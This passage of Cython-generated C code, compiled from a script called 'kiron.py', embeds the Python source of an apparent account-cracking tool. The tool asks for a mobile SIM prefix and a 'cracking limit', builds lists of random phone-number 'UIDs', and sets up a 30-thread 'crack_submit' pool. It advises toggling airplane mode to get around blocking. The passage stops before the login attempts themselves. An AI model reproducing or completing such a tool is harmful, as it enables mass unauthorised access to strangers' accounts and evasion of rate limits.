      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 375, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":376
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 *         linex()
 *         code = input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE CODE :{A} ')             # <<<<<<<<<<<<<<
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 2000, 3000, 5000, 10000')
 */
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 376, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = 0;
  __pyx_t_6 = 127;
  __Pyx_INCREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11);
  __pyx_t_5 += 57;
  __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_11);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_A); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 376, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 376, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__25);
  __pyx_t_5 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__25);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__25);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_5, __pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 376, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 376, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_code = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":377
 *         linex()
 *         code = input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE CODE :{A} ')
 *         clear()             # <<<<<<<<<<<<<<
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 2000, 3000, 5000, 10000')
 *         linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_clear); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 377, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":378
 *         code = input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE CODE :{A} ')
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 2000, 3000, 5000, 10000')             # <<<<<<<<<<<<<<
 *         linex()
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__62, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 378, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":379
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 2000, 3000, 5000, 10000')
 *         linex()             # <<<<<<<<<<<<<<
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 *         for n in range(limit):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_linex); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 379, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 379, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":380
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 2000, 3000, 5000, 10000')
 *         linex()
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))             # <<<<<<<<<<<<<<
 *         for n in range(limit):
 *             EX = "".join(random.choice(string.digits) for _ in range(6))
 */
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = 0;
  __pyx_t_6 = 127;
  __Pyx_INCREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13);
  __pyx_t_5 += 60;
  __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_13);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_A); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_6;
  __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__25);
  __pyx_t_5 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__25);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__25);
  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_5, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_limit = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "kiron.py":381
 *         linex()
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 *         for n in range(limit):             # <<<<<<<<<<<<<<
 *             EX = "".join(random.choice(string.digits) for _ in range(6))
 *             user.append(EX)
 */
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
    __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1);
    __pyx_t_5 = 0;
    __pyx_t_7 = NULL;
  } else {
    __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 381, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_7 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 381, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  for (;;) {
    if (likely(!__pyx_t_7)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        {
          Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
          #if !CYTHON_ASSUME_SAFE_MACROS
          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 381, __pyx_L1_error)
          #endif
          if (__pyx_t_5 >= __pyx_temp) break;
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_2); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 381, __pyx_L1_error)
        #else
        __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 381, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      } else {
        {
          Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);
          #if !CYTHON_ASSUME_SAFE_MACROS
          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 381, __pyx_L1_error)
          #endif
          if (__pyx_t_5 >= __pyx_temp) break;
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_2); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 381, __pyx_L1_error)
        #else
        __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 381, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      }
    } else {
      __pyx_t_2 = __pyx_t_7(__pyx_t_1);
      if (unlikely(!__pyx_t_2)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 381, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_2);
    }
    __Pyx_XDECREF_SET(__pyx_v_n, __pyx_t_2);
    __pyx_t_2 = 0;

    /* "kiron.py":382
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 *         for n in range(limit):
 *             EX = "".join(random.choice(string.digits) for _ in range(6))             # <<<<<<<<<<<<<<
 *             user.append(EX)
 *         with tred(max_workers=30) as crack_submit:
 */
    __pyx_t_2 = __pyx_pf_5kiron_2BD_genexpr(NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 382, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyString_Join(__pyx_kp_s__63, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 382, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF_SET(__pyx_v_EX, ((PyObject*)__pyx_t_3));
    __pyx_t_3 = 0;

    /* "kiron.py":383
 *         for n in range(limit):
 *             EX = "".join(random.choice(string.digits) for _ in range(6))
 *             user.append(EX)             # <<<<<<<<<<<<<<
 *         with tred(max_workers=30) as crack_submit:
 *             tl = str(len(user))
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_user); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 383, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_8 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_v_EX); if (unlikely(__pyx_t_8 == ((int)-1))) __PYX_ERR(0, 383, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "kiron.py":381
 *         linex()
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 *         for n in range(limit):             # <<<<<<<<<<<<<<
 *             EX = "".join(random.choice(string.digits) for _ in range(6))
 *             user.append(EX)
 */
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":384
 *             EX = "".join(random.choice(string.digits) for _ in range(6))
 *             user.append(EX)
 *         with tred(max_workers=30) as crack_submit:             # <<<<<<<<<<<<<<
 *             tl = str(len(user))
 *             clear()
 */
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tred); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 384, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 384, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 384, __pyx_L1_error)
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 384, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_9 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 384, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 384, __pyx_L6_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_10 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_10)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_10);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};
      __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 384, __pyx_L6_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __pyx_t_1 = __pyx_t_3;
    __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {
          __pyx_v_crack_submit = __pyx_t_1;
          __pyx_t_1 = 0;

          /* "kiron.py":385
 *             user.append(EX)
 *         with tred(max_workers=30) as crack_submit:
 *             tl = str(len(user))             # <<<<<<<<<<<<<<
 *             clear()
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mTOTAL UID \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {tl}")
 */
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_user); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 385, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_5 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 385, __pyx_L10_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 385, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 385, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_v_tl = __pyx_t_2;
          __pyx_t_2 = 0;

          /* "kiron.py":386
 *         with tred(max_workers=30) as crack_submit:
 *             tl = str(len(user))
 *             clear()             # <<<<<<<<<<<<<<
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mTOTAL UID \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {tl}")
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mSIM CODE  \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {code}")
 */
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_clear); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 386, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = NULL;
          __pyx_t_4 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_4 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
            __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 386, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          /* "kiron.py":387
 *             tl = str(len(user))
 *             clear()
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mTOTAL UID \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {tl}")             # <<<<<<<<<<<<<<
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mSIM CODE  \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {code}")
 *             print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mIF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE ')
 */
          __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 387, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_14, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 387, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 387, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          /* "kiron.py":388
 *             clear()
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mTOTAL UID \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {tl}")
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mSIM CODE  \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {code}")             # <<<<<<<<<<<<<<
 *             print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mIF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE ')
 *             linex()
 */
          __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_code, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 388, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_15, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 388, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 388, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          /* "kiron.py":389
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mTOTAL UID \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {tl}")
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mSIM CODE  \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {code}")
 *             print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mIF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE ')             # <<<<<<<<<<<<<<
 *             linex()
 *             for love in user:
 */
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__64, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 389, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          /* "kiron.py":390
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mSIM CODE  \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {code}")
 *             print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mIF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE ')
 *             linex()             # <<<<<<<<<<<<<<
 *             for love in user:
 *                 uid = code + love
 */
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_linex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 390, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = NULL;
          __pyx_t_4 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_4 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
            __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 390, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          /* "kiron.py":391
